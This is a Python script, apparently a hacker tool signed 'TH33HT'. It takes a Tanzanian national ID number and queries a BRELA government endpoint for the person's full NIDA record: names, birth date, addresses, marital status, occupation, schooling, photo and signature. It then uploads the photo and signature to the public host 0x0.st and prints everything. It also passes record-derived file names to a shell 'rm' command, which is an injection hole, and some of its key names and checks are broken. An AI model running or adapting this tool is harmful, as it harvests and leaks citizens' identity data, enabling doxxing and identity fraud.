#!/bin/python

import base64
import io
import os
import time

import prettytable
import sys

import requests
from PIL import Image

yellow = '\033[33m'
blue = '\033[34m'
cyan = '\033[36m'
green = '\033[32;1m'
red = '\033[31;1m'
close = '\033[0m'


def text_out(text):
    for character in text:
        sys.stdout.write(character)
        sys.stdout.flush()
        time.sleep(0.05)


def nida():
    print("")
    url = "https://ors.brela.go.tz/um/load/load_nida/"
    num = input(green + "Enter NIN: " + cyan)

    digit = num.isdigit()
    if str(len(num)) < str("20"):
        print(red + "\nNIN is wrong\n" + close)
        exit()
    if not digit:
        print(red + "\nNIN cant contain letters\n" + close)
        exit()

    print(close + "")

    # adding a global variable in case the try statement fails
    results = None
    profile = None
    sahihi = None
    try:
        req = requests.post(url + str(num), headers={'Content-Type': 'application/json', 'Content-Length': '0'})
        filter_ = req.json()
        results = filter_['obj']['result']
        decode = base64.b64decode(results['PHOTO'])
        img = Image.open(io.BytesIO(decode))
        img.save(results['FIRSTNAME'] + '.jpg')
        d_sig = base64.b64decode(results['SIGNATURE'])
        sign = Image.open(io.BytesIO(d_sig))
        sign.save("signature" + results['FirstName'] + ".jpg")

        picture = str(results['FirstName'] + ".jpg")
        signature = str("signature" + results['FirstName'] + ".jpg")

        pic = {'file': open(picture, "rb")}
        sig = {'file': open(signature, "rb")}

        req1 = requests.post("https://0x0.st", files=pic)
        req2 = requests.post("https://0x0.st", files=sig)

        profile = req1.text
        sahihi = req2.text

    except:
        print(
            red + "\nERROR SOMETHING IS WRONG, Probably Internet Connection or Your NIN not Found In System\n" + close)
        exit()

    def clean():
        os.system("rm " + picture)
        os.system("rm " + signature)

    no = results['NIN']
    name1 = results['FIRSTNAME']
    name2 = results['MIDDLENAME']
    name3 = results['SURNAME']
    sex = results['SEX']
    date = results['DATEOFBIRTH']
    r_region = results['RESIDENTREGION']
    r_district = results['RESIDENTDISTRICT']
    r_ward = results['RESIDENTWARD']
    r_village = results['RESIDENTVILLAGE']
    r_street = results['RESIDENTSTREET']
    r_postcode = results['RESIDENTPOSTCODE']
    p_region = results['PERMANENTREGION']
    pDistrict = results['PERMANENTDISTRICT']
    pWard = results['PERMANENTWARD']
    pVillage = results['PERMANENTVILLAGE']
    pStreet = results['PERMANENTSTREET']
    bCountry = results['BIRTHCOUNTRY']
    bRegion = results['BIRTHREGION']
    bDistrict = results['BIRTHDISTRICT']
    bWard = results['BIRTHWARD']
    nation = results['NATIONALITY']
    mStatus = results['MARITALSTATUS']
    work = results['OCCUPATION']
    pSchool = results['PRIMARYSCHOOLEDUCATION']
    pDistrict = results['PRIMARYSCHOOLDISTRICT']
    pYear = results['PRIMARYSCHOOLYEAR']

    t = prettytable.PrettyTable([red + "INFO" + close, red + "STATUS" + close])
    t.align[red + "INFO" + close] = "l"
    t.align[red + "STATUS" + close] = "l"
    t.add_row([green + "ID NUMBER" + close, cyan + str(no) + close])
    t.add_row([green + "FIRST NAME" + close, cyan + str(name1) + close])
    t.add_row([green + "MIDDLE NAME" + close, cyan + str(name2) + close])
    t.add_row([green + "LAST NAME" + close, cyan + str(name3) + close])
    t.add_row([green + "SEX" + close, cyan + str(sex) + close])
    t.add_row([green + "BIRTH DATE" + close, cyan + str(date) + close])
    t.add_row([green + "OCCUPATION" + close, cyan + str(work) + close])
    t.add_row([green + "NATIONALITY" + close, cyan + str(nation) + close])
    t.add_row([green + "MARITAL STATUS" + close, cyan + str(mStatus) + close])
    t.add_row([green + "RESIDENT REGION" + close, cyan + str(r_region) + close])
    t.add_row([green + "RESIDENT DISTRICT" + close, cyan + str(r_district) + close])
    t.add_row([green + "RESIDENT WARD" + close, cyan + str(r_ward) + close])
    t.add_row([green + "RESIDENT VILLAGE" + close, cyan + str(r_village) + close])
    t.add_row([green + "RESIDENT STREET" + close, cyan + str(r_street) + close])
    t.add_row([green + "RESIDENT POSTCODE" + close, cyan + str(r_postcode) + close])
    t.add_row([green + "PERMANENT REGION" + close, cyan + str(p_region) + close])
    t.add_row([green + "PERMANENT DISTRICT" + close, cyan + str(pDistrict) + close])
    t.add_row([green + "PERMANENT WARD" + close, cyan + str(pWard) + close])
    t.add_row([green + "PERMANENT VILLAGE" + close, cyan + str(pVillage) + close])
    t.add_row([green + "PERMANENT STREET" + close, cyan + str(pStreet) + close])
    t.add_row([green + "BIRTH COUNTRY" + close, cyan + str(bCountry) + close])
    t.add_row([green + "BIRTH REGION" + close, cyan + str(bRegion) + close])
    t.add_row([green + "BIRTH DISTRICT" + close, cyan + str(bDistrict) + close])
    t.add_row([green + "BIRTH WARD" + close, cyan + str(bWard) + close])
    t.add_row([green + "PRIMARY SCHOOL" + close, cyan + str(pSchool) + close])
    t.add_row([green + "PRIMARY SCHOOL DISTRICT" + close, cyan + str(pDistrict) + close])
    t.add_row([green + "PRIMARY SCHOOL YEAR" + close, cyan + str(pYear) + close])
    t.add_row(["", ""])
    t.add_row([green + "PICTURE" + close, cyan + profile + close])
    t.add_row([green + "SIGNATURE" + close, cyan + sahihi + close])
    print(t.get_string(title=yellow + "NIDA INFO by TH33HT: CITIZEN NAME: " + name1 + close))
    clean()


nida()
